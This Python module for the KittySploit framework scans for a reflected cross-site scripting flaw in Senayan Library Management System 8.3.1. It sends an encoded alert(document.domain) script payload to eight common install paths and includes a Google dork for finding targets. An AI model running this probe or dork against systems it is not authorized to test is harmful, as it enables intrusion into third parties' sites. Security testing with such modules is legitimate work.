#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SLiMS 8."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Senayan Library Management System v8.3.1 (Akasia) - Cross-Site Scripting Detection',
        'description': 'SLiMS 8.3.1 (Akasia) has a `destination` parameter that is vulnerable to reflected XSS. However, ensure that the `p` parameter points to the \'member\'. Additional google dork \'intext:"SLiMS 8.3.1 (Akasia)"\'.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'senayan', 'xss', 'slims', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 6,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://github.com/slims/slims8_akasia/issues/184'],
    }

    def run(self):
        for path in ('/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member', '/perpustakaan/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member', '/slims/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member', '/perpustakaan/slims/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member', '/e-library/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member', '/perpus/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member', '/digilib/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member', '/akasia/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member'):
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
            body_all = ('<script>alert(document.domain)</script>', 'SLiMS',)
            ctype_any = ('text/html',)
            if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
                self.set_info(
                    severity='medium',
                    reason='Senayan Library Management System v8.3.1 (Akasia) - Cross-Site Scripting detected',
                    path=path,
                )
                return True
        return False

